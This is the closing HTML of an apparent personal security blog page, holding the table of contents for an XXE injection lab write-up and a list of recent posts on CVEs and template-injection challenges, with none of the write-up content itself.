class="toc-number">1.</span> <span class="toc-text">XXE Injection Vulnerability Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-Injection-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">XXE Injection là gì?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">1.3.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Khai-thac-tung-level-va-POC"><span class="toc-number">1.4.</span> <span class="toc-text">Khai thác từng level và POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">Level 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Level 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">Level 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4"><span class="toc-number">1.4.4.</span> <span class="toc-text">Level 4:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-5"><span class="toc-number">1.4.5.</span> <span class="toc-text">Level 5:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-6"><span class="toc-number">1.4.6.</span> <span class="toc-text">Level 6:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-7"><span class="toc-number">1.4.7.</span> <span class="toc-text">Level 7:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-8"><span class="toc-number">1.4.8.</span> <span class="toc-text">Level 8:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-9"><span class="toc-number">1.4.9.</span> <span class="toc-text">Level 9:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce">CVE-2025-13329 File Uploader for WooCommerce</a><time datetime="2026-02-03T15:56:51.995Z" title="Created 2026-02-03 22:56:51">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/2026-01-21-Ysoserial-CC3-Analyst/" title="Ysoserial Common Collections 3 Analyst (CC3)">Ysoserial Common Collections 3 Analyst (CC3)</a><time datetime="2026-01-21T05:35:18.206Z" title="Created 2026-01-21 12:35:18">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/31/2025-12-31-SSTI-Velocity/" title="Velocity Server Side Template Injection Challenge">Velocity Server Side Template Injection Challenge</a><time datetime="2025-12-31T04:43:06.549Z" title="Created 2025-12-31 11:43:06">2025-12-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>